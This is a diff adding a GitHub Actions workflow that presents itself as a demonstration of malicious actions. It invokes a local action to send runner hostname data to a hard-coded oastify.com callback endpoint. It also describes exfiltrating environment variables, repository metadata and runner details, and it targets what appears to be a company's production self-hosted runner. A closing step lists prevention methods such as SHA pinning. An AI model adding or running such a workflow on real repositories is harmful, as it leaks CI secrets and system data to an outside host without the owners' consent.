@@ -1,0 +1,60 @@
+name: Malicious Action Usage Demonstration
+
+# This workflow demonstrates how a malicious action can be used
+# to exfiltrate data from GitHub Actions runners
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_endpoint:
+        description: 'Target endpoint for data exfiltration'
+        required: true
+        default: 'pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com'
+
+jobs:
+  malicious-action-demo:
+    runs-on: af-slim-prd  # Using AppsFlyer runner for security
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Use Malicious Action (Local)
+        uses: ./malicious-action-demo
+        with:
+          target_endpoint: ${{ github.event.inputs.target_endpoint }}
+          data_type: 'hostname'
+      
+      - name: Demonstrate External Malicious Action
+        run: |
+          echo "=== EXTERNAL MALICIOUS ACTION DEMONSTRATION ==="
+          echo "In a real attack, the workflow would look like:"
+          echo ""
+          echo "steps:"
+          echo "  - name: Malicious Data Exfiltration"
+          echo "    uses: your-username/malicious-action@v1"
+          echo "    with:"
+          echo "      target_endpoint: 'pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com'"
+          echo "      data_type: 'all'"
+          echo ""
+          echo "This would exfiltrate:"
+          echo "- Hostname information"
+          echo "- Environment variables"
+          echo "- Repository metadata"
+          echo "- Runner details"
+          echo ""
+          echo "Target endpoint: ${{ github.event.inputs.target_endpoint }}"
+          echo "Check your OAST endpoint for received data!"
+      
+      - name: Show Prevention Methods
+        run: |
+          echo "=== PREVENTION METHODS ==="
+          echo "1. Action Pinning: Always pin actions to specific commit SHAs"
+          echo "2. Action Review: Review action source code before use"
+          echo "3. Least Privilege: Use minimal required permissions"
+          echo "4. Network Restrictions: Implement network policies"
+          echo "5. Monitoring: Monitor action usage and data exfiltration"
+          echo "6. Self-Hosted Runners: Use isolated runner environments"
+          echo ""
+          echo "Example of secure action usage:"
+          echo "  - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3"
+          echo "  - uses: your-username/trusted-action@a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0"
